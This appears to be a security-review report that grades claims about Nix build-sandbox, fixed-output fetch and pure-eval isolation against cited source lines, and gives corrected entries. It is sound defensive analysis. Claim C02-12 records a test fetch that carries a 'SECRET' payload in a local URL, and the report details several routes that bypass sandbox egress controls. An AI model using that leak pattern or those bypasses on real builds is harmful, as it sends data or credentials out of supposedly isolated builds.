# Grading of D9-NIX-C01, C02, C03 (MM-DR-004 Part B)

Source: Nix at `f3f1c3c5b8ad91850e0f7c590cf177f7ab022024` (`.version` reads 2.34.8); nixpkgs at `7c8764b7c7b09b34f632464276218ef9090eaa11`. Paths below are relative to the Nix checkout unless prefixed `nixpkgs/`. Experiments ran on the installed `nix` 2.34.6 (not the pinned 2.34.8; the code paths cited are the same files, but the binary is not the pin). Experiments: evaluation only, in `grade-a/`; the two store objects they created were deleted afterwards.

Verdict scale: confirmed, marginal, plausible, needs refinement, dead.

## D9-NIX-C01 "Realize derivation in the Linux build sandbox"

| # | Claim | Evidence | Verdict | Reason |
|---|---|---|---|---|
| 1 | Name: the operation is realization in the Linux build sandbox | read: `src/libstore/unix/build/derivation-builder.cc:2097-2147` (sandbox chosen per build), `src/libstore/build/substitution-goal.cc:87`, `src/nix/build-remote/build-remote.cc:291,384` | needs refinement | The description covers substitution and remote building, neither of which runs the local sandbox. The name and the body disagree on scope. |
| 2 | Resolves a derivation via local build, substitution or remote builder | read: same as 1 | confirmed | All three routes exist. |
| 3 | "distinguishing those routes" | read: entry text | marginal | The entry names the routes but grants every route the same broken list; it never says which route breaks what. |
| 4 | Input includes sandbox, substitution and remote-build settings | read: `sandbox` `src/libstore/include/nix/store/local-settings.hh:343-374`; `sandbox-paths` :382; `sandbox-fallback` :400-401; `builders` `worker-settings.hh:135`; `substituters` `worker-settings.hh:287`; `require-sigs` `globals.hh:271` | confirmed | Setting names are real at the pin. |
| 5 | A strict ordinary local sandbox restricts filesystem and network admission | read: `local-settings.hh:353-363` (doc); `linux-derivation-builder.cc:458-460` (`CLONE_NEWNET` only when `isSandboxed()`); `derivations.cc:82-90` (InputAddressed sandboxed) | confirmed | Holds for `sandbox = true` with mount/PID namespaces available. "Strict" is undefined in the entry: it must mean `sandbox = true` and either `sandbox-fallback = false` or working namespaces. Upstream default `sandbox-fallback = true` silently disables the sandbox (debug message only) when namespaces are missing, `derivation-builder.cc:2118-2124`; NixOS sets it false, `nixpkgs/nixos/modules/services/system/nix-daemon.nix:397`. |
| 6 | Fixed-output and other configured routes have distinct permissions | read: FOD `ContentAddressed{sandboxed=false, fixed=true}` `derivations.cc:809-826`; no net namespace `linux-derivation-builder.cc:459`; resolv.conf/nsswitch for FODs :657-670; daemon env vars via `impureEnvVars` for unsandboxed types `derivation-builder.cc:1120-1141`; daemon netrc handed to `builtin:fetchurl` :1308-1311; `Impure` type unsandboxed `derivations.cc:89` behind `impure-derivations` :323; `relaxed` plus `__noChroot` :2097-2112; `allowed-impure-host-deps` and pre-build-hook `extra-sandbox-paths` :898-955 | confirmed | The entry should name these routes; "other configured routes" hides the main ones. |
| 7 | `sandbox = true` alone establishes no full hermeticity or reproducibility predicate | read: `/dev/random`, `/dev/urandom` bound in `linux-derivation-builder.cc:648-650`; `/dev/kvm` :638-639; FOD network as 6; candidate e9-nix-hermetic assurance text | confirmed | Randomness, clock and CPU remain ambient even in the strict sandbox. |
| 8 | Output: output store paths or explicit failure | read: `derivation-builder.cc:1957-1974` | confirmed | |
| 9 | Output: selected hash checks and closure registration | read: `checkOutputs` `src/libstore/build/derivation-check.cc:30-53`; `registerValidPaths` `derivation-builder.cc:1966-1974` | confirmed | Hash checks apply to fixed-output outputs only; input-addressed outputs are registered without a content check. |
| 10 | Failed builds may still have emitted logs and network payloads | read: FOD network as 6, check runs after the builder exits `derivation-builder.cc:1957-1959`; hash-mismatching CA output registered before the error :1924-1938; `keep-build-log` `globals.hh:34`; `keep-failed` `globals.hh:196` | confirmed | |
| 11 | Preserved: none established by default | inferred from 5-9 | confirmed | A conditional e9-nix-content for fixed-output and CA outputs is available (see C02) and could be listed as conditional output; omission is defensible since C02 carries it. |
| 12 | "No timing/physical preservation; no provenance is inferred from store dependency metadata" | entry text | marginal | Boilerplate shared by all nine entries; true but says nothing about this operation. |
| 13 | Broken: e9-local | read: remote builder copies the input closure to the remote store `build-remote.cc:291`; FOD builders have host network 6; `post-build-hook` `worker-settings.hh:321` | confirmed | Breakable by remote building, FOD network, or a post-build hook that uploads. |
| 14 | Broken: e9-noegress | read: as 13 | confirmed | Same mechanisms. An FOD builder is arbitrary code with network and its whole input closure mounted. |
| 15 | Broken: e9-erase | read: new world-readable store copies, logs, kept failed build dirs, registered rejected outputs (10) | confirmed | Breakable when the designated secret is in the input closure: the build makes new recoverable copies. |
| 16 | Broken: e9-nix-hermetic | read: as 6 and 7 | confirmed | Phrasing "may destroy" is loose: the predicate is never established by the stock sandbox, so this is "not established", and FOD, impure derivations, `sandbox = false`, `relaxed` plus `__noChroot`, fallback and extra sandbox paths are the routes that admit undeclared inputs outright. |
| 17 | Broken: e9-nix-repro | read: no determinism enforcement; `--check` detects it, `NotDeterministic` `derivation-builder.cc:1873-1907` | confirmed | Relational: a pair of builds is the counterexample, not one build. |
| 18 | Possibility depends on parameters, not operation name | expression | confirmed | |
| 19 | (missing) e9-gfree | read: substituted paths come from `substituters`; CA paths skip signatures `path-info.cc:119-123`, `substitution-goal.cc:87`; remote build results copied back with `NoCheckSigs` `build-remote.cc:384`; FOD route admits external bytes | needs refinement | Not listed, yet C02 lists it for the FOD route that C01 includes, and substitution imports third-party bytes. Should be in the broken list. |
| 20 | (missing, noted only) trusted users can change restricted settings such as `sandbox` | read: `src/libstore/daemon.cc:297-307` | plausible | Belongs in the input conditions ("as configured by the daemon and trusted users"), not as a broken invariant. |

Overall C01: **needs refinement**. Claims: 15 confirmed, 2 marginal, 1 plausible, 2 needs refinement (name scope, missing e9-gfree), 0 dead.

## D9-NIX-C02 "Fetch and accept fixed-output content"

| # | Claim | Evidence | Verdict | Reason |
|---|---|---|---|---|
| 1 | Fetch bytes or tree and validate the declared digest in its ingestion mode | read: FOD: digest computed per `FileIngestionMethod` Flat/NixArchive/Git `derivation-builder.cc:1705-1722`, compared `derivation-check.cc:30-44`; evaluator fetch: `src/libexpr/primops/fetchTree.cc:480-500`; flake/fetchTree narHash `src/libfetchers/fetchers.cc:262-269` | confirmed | Two distinct routes: an FOD built by the daemon (namespaced, no network namespace) and an evaluator-side fetch in the client process (no sandbox, client's network and credentials). The entry does not say which; its "daemon credentials" points at the FOD route. Needs scoping. |
| 2 | Input: flat, NAR or Git mode | read: as 1; Git needs experimental `git-hashing` `src/libstore/content-address.cc:17,88` | confirmed | Git mode is experimental at the pin. |
| 3 | Input: daemon credentials | read: daemon netrc passed into `builtin:fetchurl` `derivation-builder.cc:1308-1311`, written into the build dir `src/libstore/builtins/fetchurl.cc:13-18`; daemon env vars by `impureEnvVars` `derivation-builder.cc:1120-1141` | confirmed | |
| 4 | Input: mirrors | read: `hashed-mirrors` `local-settings.hh:626`, tried first for flat FODs `builtins/fetchurl.cc:73-86` | confirmed | nixpkgs `mirror://` is expression-level and separate. |
| 5 | Input: reference constraints | read: FOD outputs must not reference store paths `derivation-check.cc:45-52` | confirmed | |
| 6 | Holds under a trusted store/daemon and a supported digest mode | inferred from 1, 10 | confirmed | |
| 7 | Preservation concerns the accepted requested output, not rejected objects or publisher authenticity | read: 9; inferred | confirmed | |
| 8 | Output: success with verified digest binding, or hash-mismatch/build error | read: `BuildResult::Failure::HashMismatch` `derivation-check.cc:39-44` | confirmed | |
| 9 | Rejected content may exist at its own computed identity | read: comment and registration `derivation-builder.cc:1924-1938`, `derivation-check.cc:37-38`; evaluator fetch adds to the store before comparing `fetchTree.cc:480-490` | confirmed | Both routes. |
| 10 | Preserved and output: e9-nix-content | read: path built from the computed CA `derivation-builder.cc:1724-1728`; substituted CA paths re-hashed on import `local-store.cc:1046-1075`; CA paths need no signature `path-info.cc:119-123` | confirmed | Conditional on an honest store and daemon (root or direct store writes are outside it). Binding, not collision resistance: weak `outputHashAlgo` values remain accepted. |
| 11 | Broken: e9-local | read: no net namespace for FODs `linux-derivation-builder.cc:459`; builder is arbitrary with the input closure visible | confirmed | |
| 12 | Broken: e9-noegress | read: as 11; experiment: pure-mode `builtins.fetchurl { url = "http://127.0.0.1:9/leak?payload=SECRET"; sha256 = ...; }` attempted the connection (`unable to download ... Could not connect`) | confirmed | Egress happens before any hash check. |
| 13 | Broken: e9-gfree | inferred: fetched bytes originate with a remote publisher; a digest binds bytes, not origin | confirmed | |
| 14 | Broken: e9-erase | read: rejected outputs registered (9); daemon netrc copied into the build dir (3) | confirmed | Breakable when the secret is in the FOD's inputs or credentials. |
| 15 | Broken: e9-nix-hermetic | read: network, `/etc/resolv.conf`, daemon env vars as undeclared inputs (11, 3) | confirmed | The trace admits undeclared inputs; the accepted output is still pinned by the digest. |
| 16 | "No timing/physical preservation; no provenance ..." | entry text | marginal | Boilerplate. |
| 17 | (missing, optional) e9-nix-repro preserved for accepted outputs | inferred from 10 | plausible | Two accepted outputs with the same declared digest have equal NAR bytes only under collision resistance, which e9-nix-content disclaims. List it only with that condition, or leave it out. |
| 18 | (missing) substitution route | read: `fetchTree.cc:456-478` (`ensurePath` before download); `substitution-goal.cc:87` | needs refinement | An FOD output may be substituted instead of fetched; the request then goes to the substituter. Input should name `substituters`. |

Overall C02: **confirmed**, with two refinements (say which route, add substitution). Claims: 15 confirmed, 1 marginal, 1 plausible, 1 needs refinement, 0 dead.

## D9-NIX-C03 "Evaluate configuration in pure-eval mode"

| # | Claim | Evidence | Verdict | Reason |
|---|---|---|---|---|
| 1 | Pure-input restrictions, not total effect-free semantics (D9-X08) | read: 4, 5 below; D9-X08 not checked | confirmed | |
| 2 | Input: locked explicit inputs | read: `fetchTree.cc:200-205`, `src/libflake/flake-primops.cc:41` | needs refinement | Pure mode refuses unlocked inputs, except an unlocked input that carries a `narHash` is accepted with a warning. |
| 3 | `pure-eval = true` is the mode | read: `src/libexpr/include/nix/expr/eval-settings.hh:181-184` (default false); `src/nix/main.cc:428` (new CLI sets true); `--impure` `src/libcmd/common-eval-args.cc:117-122`; `--file` forces impure `src/libcmd/installables.cc:459-463`; `forceImpureByDefault` `main.cc:580-582` | confirmed | Legacy `nix-instantiate`/`nix-build` default to impure. |
| 4 | Pure restrictions block certain ambient inputs | read: `getEnv` returns "" `src/libexpr/primops.cc:1218`; `currentTime`, `currentSystem` absent :5232, :5262; `storePath` refused :1924; `<path>` lookup `eval.cc:3269`, `parser.y:455`; filesystem allow-list `eval.cc:277-288`; `NIX_PATH` ignored `eval.cc:324`; unhashed `fetchurl` refused `fetchTree.cc:451`. Experiments confirm getEnv, currentTime, unhashed fetchurl, unlocked fetchGit, `/etc/hostname`, `<nixpkgs>`, arbitrary store path | confirmed | |
| 5 | Fetch and IFD can still create effects | read and experiment: hashed fetchurl attempted network; `builtins.toFile` wrote a mode 0444 store object under `--read-write-mode`; IFD builds `primops.cc:108-122` | confirmed | |
| 6 | Nondeterministic IFD can affect values | inferred from 5 and C01 #17 | confirmed | |
| 7 | pure-eval alone establishes neither totality nor build reproducibility | inferred: no termination check; builder settings untouched by eval settings | confirmed | |
| 8 | `allow-import-from-derivation = false` rules out IFD | read: `eval-settings.hh:207-218` (default true), `primops.cc:108-113`; experiment: "cannot build ... because the option 'allow-import-from-derivation' is disabled" | confirmed | |
| 9 | Fetched inputs and store effects remain with IFD off | read and experiment as 5 | confirmed | |
| 10 | Output: value or derivation description, failure or divergence; may realize, import or fetch store objects | read: 5 | confirmed | |
| 11 | Preserved: none by default | inferred | confirmed | Optional conditional output: e9-nix-content for hash-checked fetches (`fetchTree.cc:487-500`, `fetchers.cc:262`); plausible. |
| 12 | Broken: e9-local | experiment: a URL carrying a payload is requested in pure mode; read: IFD can use remote builders `build-remote.cc:291` | confirmed | Payload must come from a declared input, which pure mode still reads. |
| 13 | Broken: e9-noegress | experiment as 12 | confirmed | |
| 14 | Broken: e9-erase | experiment: `toFile` store copy; recalled: flake sources copied into the store, fetcher and eval caches under `~/.cache/nix` | confirmed | |
| 15 | Broken: e9-nix-repro | inferred: only through IFD builds | needs refinement | Evaluation runs no builds unless IFD; with `allow-import-from-derivation = false` this route is gone. Say "via IFD". |
| 16 | Broken: e9-nix-hermetic | inferred: as 15 | needs refinement | Same: only through IFD-triggered builds, under the build settings of C01. |
| 17 | "No timing/physical preservation ..." | entry text | marginal | Boilerplate. |
| 18 | (missing) e9-gfree | read: hashed `fetchurl`, locked `fetchGit`, flake inputs and substitution `fetchTree.cc:456-478` admit external content into values | needs refinement | C04 lists it; C03 omits it although pure mode still fetches and imports external code. Add. |

Overall C03: **needs refinement**. Claims: 13 confirmed, 1 marginal, 4 needs refinement (locked inputs, repro and hermetic routes, missing e9-gfree), 0 dead.

## Corrected entries

```json
[
  {
    "id": "D9-NIX-C01",
    "name": "Realize a derivation",
    "description": "Produce a derivation's outputs by local build, substitution or remote build. Each route has its own admission rules.",
    "input": "Store and daemon state, the .drv and its input closure, derivation type (input-addressed, fixed-output, floating CA, impure), and the daemon's settings as set by its config and trusted users: sandbox, sandbox-fallback, sandbox-paths, allowed-impure-host-deps, pre-build-hook, substituters, require-sigs, builders, post-build-hook. A local build with sandbox = true and working namespaces (or sandbox-fallback = false) runs input-addressed and floating CA builds without host network and with only the input closure and fixed device nodes visible. Fixed-output and impure derivations get the host network, resolv.conf, the daemon's netrc and selected daemon environment variables. sandbox = false, or relaxed with __noChroot, removes isolation. Substitution imports bytes from a substituter; remote building copies the input closure to the builder and the outputs back. The stock sandbox does not exclude clock, randomness or CPU differences.",
    "output": "Registered output paths, or a failure. Fixed-output outputs are checked against the declared digest; input-addressed outputs are registered without a content check. A failed build may already have sent network traffic, left logs, kept its build directory (keep-failed) or registered a hash-mismatching output at its own content address.",
    "preserved": "None by default.",
    "broken": "e9-local and e9-noegress through fixed-output or impure network access, sandbox off, remote builders or a post-build hook. e9-gfree through substitution, fixed-output fetches and remote build results. e9-erase when a secret is in the input closure, through new store copies, logs and kept build directories. e9-nix-hermetic is never established by the stock sandbox and is broken outright by the network and host-path routes above. e9-nix-repro is not enforced; nix-store --check only detects a differing pair.",
    "invariants": {
      "preserved": [],
      "broken": ["e9-local", "e9-noegress", "e9-gfree", "e9-erase", "e9-nix-hermetic", "e9-nix-repro"],
      "output": []
    }
  },
  {
    "id": "D9-NIX-C02",
    "name": "Fetch and accept fixed-output content",
    "description": "Obtain bytes or a tree for a declared digest and accept them only if the computed digest in the declared ingestion mode matches. Two routes: a fixed-output derivation built by the daemon, and an evaluator-side fetch (fetchurl, fetchTarball, fetchTree) in the client process.",
    "input": "URL or fetcher, expected hash and algorithm, ingestion mode (flat, NAR, or Git under the experimental git-hashing feature), substituters, hashed-mirrors, and credentials: the daemon's netrc and impure environment variables for the derivation route, the client's for the evaluator route. Fixed-output outputs may not reference store paths. Assumes an honest store and daemon.",
    "output": "The accepted object at the store path derived from its content address, or a hash-mismatch or build error. Mismatching content is registered at its own computed content address before the error. A substituted object is re-hashed against its content address on import.",
    "preserved": "e9-nix-content for accepted objects under an honest store and daemon. This is a digest binding, not collision resistance or publisher authenticity.",
    "broken": "e9-local and e9-noegress: a fixed-output builder is arbitrary code with host network and its input closure visible, and requests leave before any hash check. e9-gfree: accepted bytes come from an outside publisher. e9-erase: rejected objects stay registered and credentials are copied into the build directory. e9-nix-hermetic: network, resolver and daemon environment are undeclared inputs, though the accepted output is pinned by the digest.",
    "invariants": {
      "preserved": ["e9-nix-content"],
      "broken": ["e9-local", "e9-noegress", "e9-gfree", "e9-erase", "e9-nix-hermetic"],
      "output": ["e9-nix-content"]
    }
  },
  {
    "id": "D9-NIX-C03",
    "name": "Evaluate in pure-eval mode",
    "description": "Evaluate an expression with pure-eval = true: ambient inputs are refused, while hash-pinned fetches, store writes and import from derivation remain.",
    "input": "Expression, its locked inputs (an unlocked input with a narHash is accepted with a warning), evaluator settings, store state. pure-eval defaults to false; the nix command sets it true unless --impure, --file or --expr. Pure mode returns an empty string from getEnv, removes currentTime and currentSystem, refuses storePath, angle-bracket lookups, NIX_PATH, absolute paths outside allowed store paths, and unhashed fetchurl or unlocked fetchTree. allow-import-from-derivation defaults to true; setting it false refuses any build during evaluation.",
    "output": "A value or derivation description, or failure or nontermination. Evaluation may fetch over the network, substitute, write store objects (toFile, path imports, .drv files) and, with IFD on, build derivations.",
    "preserved": "None by default.",
    "broken": "e9-local and e9-noegress: a hash-pinned fetch sends a request whose URL may carry data from declared inputs, before the hash check. e9-gfree: fetched and imported external content enters values. e9-erase: store writes make world-readable copies. e9-nix-repro and e9-nix-hermetic only through IFD builds, under the build settings of C01; allow-import-from-derivation = false removes that route.",
    "invariants": {
      "preserved": [],
      "broken": ["e9-local", "e9-noegress", "e9-gfree", "e9-erase", "e9-nix-repro", "e9-nix-hermetic"],
      "output": []
    }
  }
]
```
